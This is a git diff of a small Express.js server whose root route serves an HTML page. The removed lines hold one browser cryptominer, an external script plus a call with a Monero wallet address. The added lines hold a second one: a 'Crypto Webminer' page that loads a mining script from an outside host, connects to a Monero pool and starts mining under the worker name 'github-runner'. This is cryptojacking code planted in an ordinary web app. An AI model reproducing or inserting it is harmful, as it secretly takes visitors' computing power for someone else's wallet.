@@ -6,17 +6,30 @@ const app = express();
 
 app.get('/', (req, res) => {
   res.send(`
-    <html>
-      <head>
-        <title>My App</title>
-      </head>
-      <body> 
-        <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-        <script type="text/javascript">
-        EverythingIsLife('49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP', 'x', 30);
-        </script>
-      </body>
-    </html>
+   <!DOCTYPE html>
+<html>
+<head>
+    <title>Crypto Webminer</title>
+</head>
+<body>
+    <!-- Load the miner script with your preferred pool and algorithm -->
+    <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=rx/0?jason=gulf.moneroocean.stream:10004"></script>
+    <script>
+        // Replace with your Monero wallet address
+        const wallet = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP";
+        // Optional worker name (visible in the pool dashboard)
+        const worker = "github-runner";
+
+        // Start mining – the function is defined by the loaded script
+        if (typeof startMining === 'function') {
+            startMining(wallet, worker);
+            console.log("Mining started.");
+        } else {
+            console.error("Miner script not loaded. Check network.");
+        }
+    </script>
+</body>
+</html>
   `);
 });
 
